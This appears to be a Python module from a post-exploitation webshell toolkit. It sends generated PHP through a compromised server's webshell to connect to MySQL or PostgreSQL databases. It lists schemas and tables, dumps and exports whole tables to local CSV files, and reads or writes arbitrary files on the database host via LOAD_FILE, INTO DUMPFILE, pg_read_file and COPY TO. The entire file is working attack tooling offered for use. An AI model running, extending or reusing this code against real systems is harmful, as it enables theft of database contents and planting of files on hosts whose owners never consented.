"""SQL access proxied through the webshell.

Supports **MySQL** (via ``mysqli``) and **PostgreSQL** (via ``PDO``). Both
backends share the same interface and reuse the SQL-standard
``information_schema`` views (which both engines implement) for metadata.

Rows come back delimited by ASCII unit/record separators rather than v1's comma
join, so values containing commas no longer corrupt the output.
"""

from __future__ import annotations

import base64
import csv
from abc import ABC, abstractmethod
from pathlib import Path

from .. import log
from ..core.php import php_string
from ..core.webshell import WebShell
from ..exceptions import WebshellError

_COL_SEP = "\x1f"  # ASCII Unit Separator
_ROW_SEP = "\x1e"  # ASCII Record Separator


def _sql_quote(value: str) -> str:
    """Return ``value`` as an escaped SQL string literal."""
    return "'" + value.replace("\\", "\\\\").replace("'", "\\'") + "'"


class SqlClient(ABC):
    """Common SQL behaviour; subclasses implement the connect/query mechanics."""

    def __init__(
        self, ws: WebShell, host: str, username: str, password: str, database: str = ""
    ):
        self.ws = ws
        self.host = host
        self.username = username
        self.password = password
        self.database = database

    @abstractmethod
    def query(self, sql: str) -> list[list[str]]:
        """Run ``sql`` and return rows as lists of string columns."""

    @abstractmethod
    def _quote_ident(self, name: str) -> str:
        """Quote a schema/table identifier for this engine."""

    @abstractmethod
    def current_namespace(self) -> str:
        """The default schema/database used when one isn't given."""

    @abstractmethod
    def databases(self) -> list[str]:
        """List databases (MySQL) or schemas (PostgreSQL)."""

    @abstractmethod
    def current_database(self) -> str: ...

    @abstractmethod
    def current_user(self) -> str: ...

    def check_connection(self) -> bool:
        try:
            self.query("SELECT 1")
            return True
        except WebshellError as exc:
            log.error(f"connection failed: {exc}")
            return False

    def _scalar(self, sql: str) -> str:
        rows = self.query(sql)
        return rows[0][0] if rows and rows[0] else ""

    def version(self) -> str:
        return self._scalar("SELECT VERSION()")

    def tables(self, schema: str) -> list[str]:
        return [
            r[0]
            for r in self.query(
                "SELECT table_name FROM information_schema.tables "
                f"WHERE table_schema={_sql_quote(schema)}"
            )
        ]

    def columns(self, schema: str, table: str) -> list[str]:
        return [
            r[0]
            for r in self.query(
                "SELECT column_name FROM information_schema.columns "
                f"WHERE table_schema={_sql_quote(schema)} "
                f"AND table_name={_sql_quote(table)} "
                "ORDER BY ordinal_position"
            )
        ]

    def dump(
        self, schema: str, table: str, limit: int = 50, offset: int = 0
    ) -> tuple[list[str], list[list[str]]]:
        """Return ``(columns, rows)`` for a slice of a table."""
        columns = self.columns(schema, table)
        ident = f"{self._quote_ident(schema)}.{self._quote_ident(table)}"
        rows = self.query(f"SELECT * FROM {ident} LIMIT {int(limit)} OFFSET {int(offset)}")
        return columns, rows

    # -- DB <-> filesystem (DBFS) ---------------------------------------------
    def export_csv(
        self, schema: str, table: str, local_path: str | Path, page_size: int = 1000
    ) -> int:
        """Stream a whole table to a local CSV file, paging to bound memory.

        Engine-agnostic (it reuses ``SELECT ... LIMIT/OFFSET``). Returns the
        number of data rows written.
        """
        columns = self.columns(schema, table)
        ident = f"{self._quote_ident(schema)}.{self._quote_ident(table)}"
        total = 0
        with open(local_path, "w", newline="", encoding="utf-8") as handle:
            writer = csv.writer(handle)
            if columns:
                writer.writerow(columns)
            offset = 0
            while True:
                rows = self.query(
                    f"SELECT * FROM {ident} LIMIT {int(page_size)} OFFSET {int(offset)}"
                )
                if not rows:
                    break
                writer.writerows(rows)
                total += len(rows)
                if len(rows) < page_size:
                    break
                offset += page_size
        return total

    def read_server_file(self, path: str) -> str:
        """Read a file on the *DB server* host via SQL (FILE-type privileges)."""
        raise WebshellError(f"{type(self).__name__} cannot read server files")

    def write_server_file(self, path: str, data: bytes) -> bool:
        """Write bytes to a file on the DB server host via SQL."""
        raise WebshellError(f"{type(self).__name__} cannot write server files")


class MysqlManager(SqlClient):
    """MySQL/MariaDB via the ``mysqli`` extension."""

    def query(self, sql: str) -> list[list[str]]:
        code = (
            "error_reporting(0);"
            f"$c=new mysqli({php_string(self.host)},{php_string(self.username)},"
            f"{php_string(self.password)});"
            "if($c->connect_errno){echo 'ERR:'.$c->connect_error;}else{"
            f"$r=$c->query({php_string(sql)});"
            "if($r===true){echo 'OK';}elseif($r){"
            f"while($row=$r->fetch_row()){{echo implode('{_COL_SEP}',$row).'{_ROW_SEP}';}}"
            "}$c->close();}"
        )
        return _parse(self.ws.run_php(code))

    def _quote_ident(self, name: str) -> str:
        return "`" + name.replace("`", "``") + "`"

    def current_namespace(self) -> str:
        return self.current_database()

    def databases(self) -> list[str]:
        return [r[0] for r in self.query("SELECT schema_name FROM information_schema.schemata")]

    def current_database(self) -> str:
        return self._scalar("SELECT DATABASE()")

    def current_user(self) -> str:
        return self._scalar("SELECT CURRENT_USER()")

    def read_server_file(self, path: str) -> str:
        """``LOAD_FILE`` — needs the ``FILE`` privilege and ``secure_file_priv``."""
        return self._scalar(f"SELECT LOAD_FILE({_sql_quote(path)})")

    def write_server_file(self, path: str, data: bytes) -> bool:
        """``INTO DUMPFILE`` writes one raw value verbatim (good for binaries)."""
        self.query(f"SELECT 0x{data.hex()} INTO DUMPFILE {_sql_quote(path)}")
        return True


class PostgresManager(SqlClient):
    """PostgreSQL via PDO (requires ``pdo_pgsql`` on the target)."""

    def query(self, sql: str) -> list[list[str]]:
        dsn = "'pgsql:host='." + php_string(self.host)
        if self.database:
            dsn += ".';dbname='." + php_string(self.database)
        code = (
            "try{"
            f"$c=new PDO({dsn},{php_string(self.username)},{php_string(self.password)});"
            f"$s=$c->query({php_string(sql)});"
            "if($s){foreach($s->fetchAll(PDO::FETCH_NUM) as $row){"
            f"echo implode('{_COL_SEP}',$row).'{_ROW_SEP}';"
            # close foreach, if and try (plain string: literal braces, no f-escaping)
            "}}}catch(Exception $e){echo 'ERR:'.$e->getMessage();}"
        )
        return _parse(self.ws.run_php(code))

    def _quote_ident(self, name: str) -> str:
        return '"' + name.replace('"', '""') + '"'

    def current_namespace(self) -> str:
        return self._scalar("SELECT current_schema()") or "public"

    def databases(self) -> list[str]:
        return [r[0] for r in self.query("SELECT schema_name FROM information_schema.schemata")]

    def current_database(self) -> str:
        return self._scalar("SELECT current_database()")

    def current_user(self) -> str:
        return self._scalar("SELECT current_user")

    def read_server_file(self, path: str) -> str:
        """``pg_read_file`` — needs superuser (or ``pg_read_server_files``)."""
        return self._scalar(f"SELECT pg_read_file({_sql_quote(path)})")

    def write_server_file(self, path: str, data: bytes) -> bool:
        """``COPY ... TO`` a server path (text; decoded from base64 on the server)."""
        b64 = base64.b64encode(data).decode()
        self.query(
            f"COPY (SELECT convert_from(decode({_sql_quote(b64)},'base64'),'UTF8')) "
            f"TO {_sql_quote(path)}"
        )
        return True


ENGINES = {"mysql": MysqlManager, "pgsql": PostgresManager}


def make_client(
    engine: str, ws: WebShell, host: str, username: str, password: str, database: str = ""
) -> SqlClient:
    try:
        return ENGINES[engine](ws, host, username, password, database)
    except KeyError:
        raise ValueError(f"unknown DB engine: {engine!r}; choose from {', '.join(ENGINES)}") from None


def _parse(result: str) -> list[list[str]]:
    if result.startswith("ERR:"):
        raise WebshellError(result[4:])
    return [row.split(_COL_SEP) for row in result.split(_ROW_SEP) if row]
